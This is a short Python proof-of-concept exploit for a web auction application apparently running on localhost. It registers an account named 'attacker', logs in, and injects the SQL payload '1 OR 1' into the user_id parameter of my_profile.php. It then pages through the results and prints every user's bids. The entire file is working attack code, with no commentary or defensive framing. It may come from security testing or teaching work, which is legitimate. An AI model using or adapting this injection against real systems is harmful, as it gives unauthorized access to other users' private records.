import requests
from bs4 import BeautifulSoup

BASE_URL = "http://localhost:8080"  # Base URL of the web application
INDEX_URL = f"{BASE_URL}/index.php"  # URL of the index page

# SQL Injection payload, returning all records regardless of the user_id.
SQL_INJECTION_PAYLOAD = "1 OR 1"

# Function to exploit SQL Injection in getUserBids
def exploit_getUserBids(cookie):
    page = 1
    items_per_page = 10  # Adjust the number of items per page as needed
    exploit_url = f"{BASE_URL}/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}&page={page}"
    
    while True:
        response = requests.get(exploit_url, cookies=cookie)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            table = soup.find('table', attrs={'class': 'table table-striped'})
            print("Exploit Successful! All Bids:")
            for row in table.find_all('tr'):
                cells = [cell.text.strip() for cell in row.find_all('td')]
                print(" | ".join(cells))
            
            next_link = soup.find('a', attrs={'class': 'page-link', 'aria-label': 'Next'})
            if next_link:
                page += 1
                exploit_url = f"{BASE_URL}/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}&page={page}"
            else:
                break
        else:
            print("Exploit Failed!")
            break

# Function to sign up a new user
def signup(user_name, password):
    signup_url = f"{BASE_URL}/signup.php"
    signup_data = {
        "user_name": user_name,
        "password": password
    }
    response = requests.post(signup_url, data=signup_data)
    if response.status_code == 200:
        print("User signed up successfully.")
    else:
        print("Failed to sign up the user.")

# Function to log in and retrieve the session cookie
def login(user_name, password):
    login_url = f"{BASE_URL}/login.php"
    login_data = {
        "user_name": user_name,
        "password": password
    }
    session = requests.session()
    response = session.post(login_url, data=login_data)
    if response.status_code == 200:
        print("User logged in successfully.")
        return session.cookies.get_dict()
    else:
        print("Failed to log in.")
        return None

def main():
    # Sign up a new user
    user_name = "attacker"
    password = "attacker123"
    signup(user_name, password)

    # Log in with the created user
    cookie = login(user_name, password)
    # Exploit the SQL Injection in getUserBids
    exploit_getUserBids(cookie)

if __name__ == "__main__":
    main()
